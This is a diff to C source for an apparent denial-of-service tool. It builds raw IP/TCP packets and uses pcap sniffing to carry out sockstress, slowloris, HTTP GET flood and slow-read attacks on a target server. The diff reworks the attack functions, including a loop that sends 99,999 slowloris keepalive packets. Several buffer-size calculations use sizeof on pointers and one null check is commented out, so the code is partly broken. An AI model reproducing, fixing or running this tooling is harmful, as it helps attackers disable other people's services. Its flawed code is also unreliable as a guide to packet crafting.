@@ -2,7 +2,6 @@
 
 void send_ack(u_int32_t *source_ip, u_int32_t *dst_ip, u_short source_port, u_int32_t seq, u_int32_t ack, u_char *argv[])
 {
-    //printf("SEND ACK request are: %s and %s and %s\n", argv[2], argv[1], argv[0]);
     struct ip iph;
     struct tcphdr tcph;
     struct sockaddr_in dest;
@@ -44,7 +43,7 @@ void send_ack(u_int32_t *source_ip, u_int32_t *dst_ip, u_short source_port, u_in
     tcph.th_ack = htonl(seq + 1);
     tcph.th_x2 = 0;
     tcph.th_off = sizeof(struct tcphdr) / 4;
-    if(strcmp(argv[0], "sockstress") == 0)
+    if(strcmp((char *)argv[0], "sockstress") == 0)
         tcph.th_flags = 0x10;
     else
         tcph.th_flags = 0x18;
@@ -82,7 +81,7 @@ void send_ack(u_int32_t *source_ip, u_int32_t *dst_ip, u_short source_port, u_in
     close(sock_raw);
 }
 
-void start_sniffing(char *argv[])
+void* start_sniffing(char *argv[])
 {
     pcap_t *descr;
     char filter[35];
@@ -121,7 +120,7 @@ void start_sniffing(char *argv[])
     pcap_freecode(&filterf);
 
     //getting link-layer header type = 1 means Ethernet according to IEEE 802.3
-    int hdr_type = pcap_datalink(descr);
+    pcap_datalink(descr);
     //int length = 0;
 
     //if(hdr_type == 1)
@@ -138,6 +137,7 @@ void start_sniffing(char *argv[])
     //}
     //pcap_close(descr);
     printf("Capturing finished!\n");
+    return 0;
     //exit(0);
 }
 void packet_process(struct attack_params *packet)
@@ -155,7 +155,8 @@ void packet_process(struct attack_params *packet)
 
     ip = (struct ip *)(packet->a_packet + sizeof(struct ether_header));
     //printf("Size of ether_header is: %d\n", sizeof(struct ether_header));
-    tcp = (struct tcphdr *)(packet->a_packet + SIZE_ETHERNET + (IP_HL(ip)*4));
+    tcp = (struct tcphdr *)(packet->a_packet + sizeof(struct iphdr) + sizeof(struct ether_header));
+    //tcp = (struct tcphdr *)(packet->a_packet + SIZE_ETHERNET + (IP_HL(ip)*4));
     
     //if(tcp->th_flags & TH_ACK && !(tcp->th_flags & TH_RST) && !(tcp->th_flags & TH_PUSH))
     if(tcp->th_flags == 0x12) //
@@ -171,7 +172,7 @@ void packet_process(struct attack_params *packet)
         u_int32_t seq_n = ntohl(tcp->th_seq);
         u_int32_t ack_n = ntohl(tcp->th_ack);
 
-        if(strcmp(packet->args[0], "sockstress") == 0)
+        if(strcmp((char *)packet->args[0], "sockstress") == 0)
         {
             send_ack(((u_int32_t *)&ip->ip_dst.s_addr), (u_int32_t *)&ip->ip_src.s_addr, (u_short)ntohs(tcp->th_dport), seq_n, ack_n, packet->args);
         }
@@ -180,7 +181,7 @@ void packet_process(struct attack_params *packet)
             send_syn_ack(((u_int32_t *)&ip->ip_dst.s_addr), (u_int32_t *)&ip->ip_src.s_addr, (u_short)ntohs(tcp->th_dport), seq_n, ack_n, packet->args);
         }
     }
-    if(strcmp(packet->args[0], "slowread") == 0)
+    if(strcmp((char *)packet->args[0], "slowread") == 0)
     {
         if(tcp->th_flags == 0x18) //&& !(tcp->th_flags & TH_RST) && !(tcp->th_flags & TH_PUSH))
         {
@@ -258,8 +259,12 @@ void send_syn_ack(u_int32_t *source_ip, u_int32_t *dst_ip, u_short source_port, 
     iph.ip_sum = 0;
     iph.ip_src.s_addr = (u_int32_t) *source_ip;
     iph.ip_dst.s_addr = (u_int32_t) *dst_ip;
-    iph.ip_sum = csum((unsigned short *) pkt_syn_ack, iph.ip_len >> 1);
-
+    iph.ip_sum = chksum((uint16_t *) pkt_syn_ack, sizeof(struct ip));//iph.ip_len >> 1
+    if(iph.ip_sum == 0)
+        {
+            printf("On the right track");
+            //exit(0);
+        }
     //printf("Source port in ACK message is: %u\n", source_port);
     memcpy(pkt_syn_ack, &iph, sizeof(iph));
 
@@ -298,24 +303,25 @@ void send_syn_ack(u_int32_t *source_ip, u_int32_t *dst_ip, u_short source_port, 
         //exit(1);
     }
 
-    free(pkt_syn_ack);
+    //free(pkt_syn_ack);
 
-    if(strcmp(argv[0], "slowloris") == 0)
+    if(strcmp((char *)argv[0], "slowloris") == 0)
     {
         printf("\nSlowloris");
         slowloris(&sock_raw, source_ip, dst_ip, source_port, ntohl(tcph.th_seq), ntohl(tcph.th_ack), argv);
     }
-    else if(strcmp(argv[0], "http") == 0) 
+    else if(strcmp((char *)argv[0], "http") == 0) 
     {
         printf("\nHTTP Get!");
         get_flood(&sock_raw, source_ip, dst_ip, source_port, ntohl(tcph.th_seq), ntohl(tcph.th_ack), argv);
     }
-    else if(strcmp(argv[0], "slowread") == 0)
+    else if(strcmp((char *)argv[0], "slowread") == 0)
     {
         printf("\nSlow Read!");
         get_flood(&sock_raw, source_ip, dst_ip, source_port, ntohl(tcph.th_seq), ntohl(tcph.th_ack), argv);
     }
 
+    bzero(pkt_syn_ack, pkt_size);
     close(sock_raw);
 }
 
@@ -326,16 +332,16 @@ void slowloris(int *sock_raw, u_int32_t *source_ip, u_int32_t *dst_ip, u_short s
     struct tcphdr tcph;
     struct sockaddr_in dest;
 
-    uint8_t pkt_len = sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(argv[2]) + sizeof(argv[1]) + 53 + 1; //53 is for GET %s HTTP.. and 1 is for \0 len in bytes
+    uint16_t pkt_len = sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(argv[2]) + sizeof(argv[1]) + 18 + 11 + 93 + 76 + 36 + 35 + 11 + 27 + 37 + 1; //53 is for GET %s HTTP.. and 1 is for \0 len in bytes
     //uint8_t data_len = sizeof(argv[2]) + sizeof(argv[1]) + 53 + 1; //53 is for GET %s HTTP.. and 1 is for \0 len in bytes
-    uint16_t data_len = strlen(argv[2]) + sizeof(argv[1]) + 18 + 11 + 93 + 76 + 36 + 35 + 11 + 27 + 38; //53 is for GET %s HTTP.. and 1 is for \0 len in bytes
-    char *pkt_data;
+    uint16_t data_len = /*strlen?*/sizeof(argv[2]) + sizeof(argv[1]) + 18 + 11 + 93 + 76 + 36 + 35 + 11 + 27 + 38; //53 is for GET %s HTTP.. and 1 is for \0 len in bytes
+    char *pkt_data = 0;
     pkt_data = (char *) malloc(data_len);
-    if(pkt_data == NULL)
-    {
-        perror("Could not allocate pkt_data mem on heap.\n");
-        exit(-1);
-    }
+    //if(pkt_data == NULL)
+    //{
+    //    perror("Could not allocate pkt_data mem on heap.\n");
+    //    exit(-1);
+    //}
 
     bzero(pkt_data, data_len);
     uint8_t *packet;
@@ -346,6 +352,20 @@ void slowloris(int *sock_raw, u_int32_t *source_ip, u_int32_t *dst_ip, u_short s
         perror("Could not allocate packet mem on heap.\n");
         exit(-1);
     }
+    bzero(packet, pkt_len);
+    /*
+     Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)
+     Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.52 Safari/536.5
+     Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1
+     Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36
+     Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36
+     Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko
+     Mozilla/5.0 (X11; Linux) KHTML/4.9.1 (like Gecko) Konqueror/4.9
+     Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1
+     Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16
+     Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A
+     *
+     */
 
     //sprintf(pkt_data, "GET %s HTTP/1.1\r\nHost: %s\r\nConnection: keep-alive\r\n", argv[2], argv[1]);
     sprintf(pkt_data,
@@ -360,20 +380,20 @@ void slowloris(int *sock_raw, u_int32_t *source_ip, u_int32_t *dst_ip, u_short s
     "Upgrade-Insecure-Requests: 1\r\n", //37
     argv[2], argv[1]);
 
-    u_int32_t pkt_data_len = strlen(pkt_data);
+    uint32_t pkt_data_len = strlen(pkt_data);
 
     iph.ip_hl = 5;
     iph.ip_v = 4;
     iph.ip_tos = 0;
     iph.ip_len = htons(sizeof(struct ip) + sizeof(struct tcphdr) + pkt_data_len);
-    iph.ip_id = htons(12348);
+    iph.ip_id = htons(12347);
     iph.ip_off = 0;
     iph.ip_ttl = 64;
     iph.ip_p = IPPROTO_TCP;
     iph.ip_sum = 0;
     iph.ip_src.s_addr = *source_ip;
     iph.ip_dst.s_addr = *dst_ip;
-    iph.ip_sum = csum((unsigned short *) pkt_data, iph.ip_len >> 1);
+    iph.ip_sum = chksum((uint16_t *) packet, sizeof(struct ip)/*iph.ip_len >> 1*/); //*****************************pkt_data
 
     memcpy(packet, &iph, sizeof(iph));
     //printf("TCP segments length: %u\n", pkt_data_len);
@@ -404,17 +424,20 @@ void slowloris(int *sock_raw, u_int32_t *source_ip, u_int32_t *dst_ip, u_short s
         perror("Failed to send HTTP Get request packet!\n");
         //exit(1);
     }
-
+    //******free(packet);
+    bzero(pkt_data, pkt_data_len);
+    bzero(packet, pkt_len);//**********
     sprintf(pkt_data, "X-a: b\r\n");
 
     u_int32_t pkt_data_len2 = strlen(pkt_data);
+    //**********packet = (uint8_t *) malloc(pkt_len - data_len + pkt_data_len2);
 
     for(int i = 0; i < 99999; i++)
     {
         iph.ip_len = htons(sizeof(struct ip) + sizeof(struct tcphdr) + pkt_data_len2);
         iph.ip_id = htons(12348);
         iph.ip_sum = 0;
-        iph.ip_sum = csum((unsigned short *) pkt_data, iph.ip_len >> 1);
+        iph.ip_sum = chksum((uint16_t *) pkt_data, sizeof(struct ip));
 
         memcpy(packet, &iph, sizeof(iph));
 
@@ -436,13 +459,14 @@ void slowloris(int *sock_raw, u_int32_t *source_ip, u_int32_t *dst_ip, u_short s
         if(sendto(*sock_raw, packet, sizeof(struct iphdr) + sizeof(struct tcphdr) + pkt_data_len2, 0, (struct sockaddr *) &dest, sizeof(struct sockaddr)) < 0)
         {
             perror("Failed to send keepalive packet!\n");
-            exit(1);
+            
+            //exit(1);
         }
         //sleep(10);
 
     }
     free(pkt_data);
-    free(packet);
+    free(packet); 
     pthread_exit(0);
 }
 
@@ -452,8 +476,8 @@ void get_flood(int *sock_raw, u_int32_t *source_ip, u_int32_t *dst_ip, u_short s
     struct tcphdr tcph;
     struct sockaddr_in dest;
 
-    uint16_t pkt_len = sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct tcphdr) + strlen(argv[2]) + sizeof(argv[1]) + 18 + 11 + 93 + 76 + 36 + 35 + 11 + 27 + 38; //53 is for GET %s HTTP.. and 1 is for \0 len in bytes
-    uint16_t data_len = strlen(argv[2]) + sizeof(argv[1]) + 18 + 11 + 93 + 76 + 36 + 35 + 11 + 27 + 38; //53 is for GET %s HTTP.. and 1 is for \0 len in bytes
+    uint16_t pkt_len = sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(argv[2]) + sizeof(argv[1]) + 18 + 11 + 93 + 76 + 36 + 35 + 11 + 27 + 38; //53 is for GET %s HTTP.. and 1 is for \0 len in bytes
+    uint16_t data_len = sizeof(argv[2]) + sizeof(argv[1]) + 18 + 11 + 93 + 76 + 36 + 35 + 11 + 27 + 38; //53 is for GET %s HTTP.. and 1 is for \0 len in bytes
     char *pkt_data;
     pkt_data = (char *) malloc(data_len);
     if(pkt_data == NULL)
@@ -486,7 +510,7 @@ void get_flood(int *sock_raw, u_int32_t *source_ip, u_int32_t *dst_ip, u_short s
     "Upgrade-Insecure-Requests: 1\r\n\r\n", //37
     argv[2], argv[1]);
 
-    u_int32_t pkt_data_len = strlen(pkt_data);
+    uint32_t pkt_data_len = strlen(pkt_data);
 
     iph.ip_hl = 5;
     iph.ip_v = 4;
@@ -499,7 +523,7 @@ void get_flood(int *sock_raw, u_int32_t *source_ip, u_int32_t *dst_ip, u_short s
     iph.ip_sum = 0;
     iph.ip_src.s_addr = *source_ip;
     iph.ip_dst.s_addr = *dst_ip;
-    iph.ip_sum = csum((unsigned short *) pkt_data, iph.ip_len >> 1);
+    iph.ip_sum = chksum((unsigned short *) packet, sizeof(struct ip)); //pkt_data, iph.ip_len >> 1
 
     memcpy(packet, &iph, sizeof(iph));
     //printf("TCP segments length: %u\n", pkt_data_len);
@@ -511,7 +535,7 @@ void get_flood(int *sock_raw, u_int32_t *source_ip, u_int32_t *dst_ip, u_short s
     tcph.th_x2 = 0;
     tcph.th_off = sizeof(struct tcphdr) / 4;
     tcph.th_flags = TH_ACK;
-    if(strcmp(argv[0], "slowread") == 0)
+    if(strcmp((char *)argv[0], "slowread") == 0)
         tcph.th_win = htons(28);
     else
         tcph.th_win = htons(29200);
@@ -533,57 +557,11 @@ void get_flood(int *sock_raw, u_int32_t *source_ip, u_int32_t *dst_ip, u_short s
         perror("Failed to send HTTP Get request packet!\n");
         exit(1);
     }
-
-    pthread_exit(0);
-    //char *request;
-    //request = "/icons/ubuntu-logo.png";
-
-    //uint8_t pkt_data_len2 = strlen(request) + sizeof(argv[1]) + 53 + 1; //53 is for GET %s HTTP.. + additional 2 for ending \r\n and 1 is for \0 (in bytes)
-    //char *pkt_data2;
-    //pkt_data2 = malloc(pkt_data_len2);
-    //memset(pkt_data2, 0, pkt_data_len2);
-    ////User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n
-    //sprintf(pkt_data2, "GET %s HTTP/1.1\r\nHost: %s\r\nConnection: keep-alive\r\n\r\n", request, argv[1]);
-
-    ////u_int32_t pkt_data_len2 = strlen(pkt_data);
-
-    //for(int i = 0; i < 0; i++)
-    //{
-    //    iph.ip_len = htons(sizeof(struct ip) + sizeof(struct tcphdr) + pkt_data_len2);
-    //    iph.ip_id = htons(12348);
-    //    iph.ip_sum = 0;
-    //    iph.ip_sum = csum((unsigned short *) pkt_data2, iph.ip_len >> 1);
-
-    //    memcpy(packet, &iph, sizeof(iph));
-
-    //    //Seq number has to be incremented according to previous packets data length
-    //    tcph.th_seq = htonl(seq + pkt_data_len + (i*pkt_data_len2));
-    //    tcph.th_ack = htonl(ack);
-    //    tcph.th_flags = TH_ACK;
-    //    tcph.th_win = htons(29200);
-    //    tcph.th_sum = 0;
-    //    tcph.th_sum = tcp_chksum(iph, tcph, (u_int8_t *)pkt_data2, pkt_data_len2);
-
-    //    memcpy(packet + sizeof(iph), &tcph, sizeof(tcph));
-
-    //    //Seq numbers has to be changed for every packet!
-    //    memcpy(packet + sizeof(iph) + sizeof(tcph), pkt_data2, pkt_data_len2 * sizeof(u_int8_t));
-
-    //    //sleep(10);
-    //    printf("Sending another request from thread: %lu.\n", pthread_self());
-    //    if(sendto(*sock_raw, packet, sizeof(struct iphdr) + sizeof(struct tcphdr) + pkt_data_len2, 0, (struct sockaddr *) &dest, sizeof(struct sockaddr)) < 0)
-    //    {
-    //        perror("Failed to send keepalive packet!\n");
-    //        exit(1);
-    //    }
-    //    //free(pkt_data);
-    //    //sleep(10);
-
-    //}
-    close(*sock_raw);
+    
     free(pkt_data);
     free(packet);
-
+    //close(*sock_raw);
+    pthread_exit(0);
 }
 
 
